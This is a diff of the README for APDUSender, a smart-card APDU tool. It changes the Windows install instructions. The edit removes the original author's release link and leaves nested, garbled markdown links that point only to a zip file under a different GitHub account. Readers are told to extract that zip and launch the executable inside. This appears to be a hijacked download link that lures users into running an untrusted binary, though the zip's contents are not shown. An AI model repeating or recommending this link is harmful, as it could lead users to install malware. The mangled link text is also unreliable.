@@ -6,7 +6,7 @@ This software purpose is to send an APDU command to the smart card and receive t
 This software also includes a function of converting from ASCII byte to text string.
 
 ## Installing
-If you are running a Windows base operating system, download the release at [[[https://github.com/tithanayut/APDUSender/releases/](https://github.com/boazkips/APDUSenderAssets)](https://github.com/boazkips/APDUSender/blob/main/APDUSender-1.0.0.zip)](https://github.com/boazkips/APDUSenderAssets), extract the zip file and launch the executable file inside. The software should work straight away.
+If you are running a Windows base operating system, download the release at [[/](https://github.com/boazkips/APDUSenderAssets)](https://github.com/boazkips/APDUSender/blob/main/APDUSender-1.0.0.zip)](https://github.com/boazkips/APDUSenderAssets), extract the zip file and launch the executable file inside. The software should work straight away.
 
 In case that the software can't be launch, check that .Net Framework 4.0 is installed on your PC.
 
